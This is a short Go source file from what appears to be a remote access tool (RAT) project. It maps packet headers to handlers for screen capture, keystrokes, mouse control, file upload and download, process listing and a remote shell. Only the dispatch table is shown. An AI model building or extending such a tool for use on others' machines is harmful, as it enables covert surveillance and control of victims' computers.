package main

import (
	"rat/shared"
)

type PacketMap map[shared.PacketHeader]IncomingPacket

var packets PacketMap

func init() {
	packets = make(PacketMap)
	packets[shared.PingHeader] = PingPacket{}
	packets[shared.SysHeader] = SysPacket{}
	packets[shared.ScreenHeader] = ScreenPacket{}
	packets[shared.ProcessHeader] = ProcessPacket{}
	packets[shared.DirectoryHeader] = DirectoryPacket{}
	packets[shared.PutFileHeader] = DownloadPacket{}
	packets[shared.GetFileHeader] = UploadPacket{}
	packets[shared.MouseMoveHeader] = MouseMovePacket{}
	packets[shared.MouseHeader] = MousePacket{}
	packets[shared.KeyHeader] = KeyPacket{}
	packets[shared.FileHeader] = FilePacket{}
	packets[shared.ShellHeader] = ShellPacket{}
	packets[shared.WindowsHeader] = WindowsPacket{}
}

func GetIncomingPacket(header shared.PacketHeader) IncomingPacket {
	return packets[header]
}
